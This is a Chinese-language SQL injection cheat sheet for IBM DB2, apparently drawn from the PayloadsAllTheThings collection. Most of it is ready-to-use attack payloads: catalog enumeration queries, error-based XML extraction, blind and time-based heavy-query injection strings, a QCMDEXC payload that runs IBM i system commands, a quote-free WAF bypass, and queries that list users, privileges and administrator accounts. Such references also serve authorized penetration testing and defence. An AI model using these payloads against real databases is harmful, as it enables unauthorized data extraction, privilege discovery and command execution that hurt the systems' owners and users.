# DB2 Injection - DB2数据库注入

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection DB2 IBM 数据库注入
攻击类型: Data Extraction Command Execution Information Disclosure
关键词: DB2 IBM sysibm syscat sysdummy1 QCMDEXC
技术: Error Based Blind Based Time Based Heavy Query
工具: sqlmap xmlagg xmlrow
版本: IBM DB2 AS-400 IBM i

[CONTENT]

## DB2注入概述

IBM DB2是IBM开发的关系数据库管理系统家族。最初在1980年代为大型机创建，DB2已发展支持各种平台和工作负载。

## DB2注释

| 类型 | 示例 |
|------|------|
| SQL注释 | `--` |

## DB2默认数据库

| 名称 | 描述 |
|------|------|
| SYSIBM | 核心系统目录表 |
| SYSCAT | 用户友好的元数据视图 |
| SYSSTAT | 查询优化器统计表 |
| SYSPUBLIC | 所有用户可用对象的元数据 |
| SYSIBMADM | 管理监控视图 |
| SYSTOOLs | 数据库管理工具 |

## 信息枚举

```sql
-- DBMS版本
select versionnumber, version_timestamp from sysibm.sysversions;
select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
select getvariable('sysibm.version') from sysibm.sysdummy1

-- 当前用户
select user from sysibm.sysdummy1
select session_user from sysibm.sysdummy1
select system_user from sysibm.sysdummy1

-- 当前数据库
select current server from sysibm.sysdummy1

-- 操作系统信息
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info
```

### 列数据库

```sql
SELECT distinct(table_catalog) FROM sysibm.tables
SELECT schemaname FROM syscat.schemata;
```

### 列表

```sql
SELECT table_name FROM sysibm.tables
SELECT name FROM sysibm.systables
SELECT tbname FROM sysibm.syscolumns WHERE name='username'
```

### 列列

```sql
SELECT name, tbname, coltype FROM sysibm.syscolumns
```

## Error Based注入

```sql
-- 返回所有XML格式字符串
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- 无重复元素
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- XML元素格式
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
```

## Blind Based注入

| 功能 | SQL查询 |
|------|---------|
| Substring | `select substr('abc',2,1) FROM sysibm.sysdummy1` |
| ASCII值 | `select chr(65) from sysibm.sysdummy1` |
| CHAR转ASCII | `select ascii('A') from sysibm.sysdummy1` |
| 选择第N行 | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only` |
| 位运算AND | `select bitand(1,0) from sysibm.sysdummy1` |
| 位运算OR | `select bitor(1,0) from sysibm.sysdummy1` |

## Time Based注入

使用重查询，如果用户以ASCII 68('D')开头，重查询将被执行：

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68
```

## 命令执行

在IBM i(原名AS-400)上，可使用`QSYS2.QCMDEXC()`执行IBM i CL命令：

```sql
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
```

## WAF绕过

### 避免引号

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```

## 账户和权限

```sql
-- 列出用户
select distinct(grantee) from sysibm.systabauth
select distinct(definer) from syscat.schemata
select grantee from syscat.dbauth

-- 列出权限
select * from syscat.tabauth
select * from SYSIBM.SYSUSERAUTH

-- 列出DBA账户
select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'

-- DB文件位置
select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'
```

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/DB2 Injection.md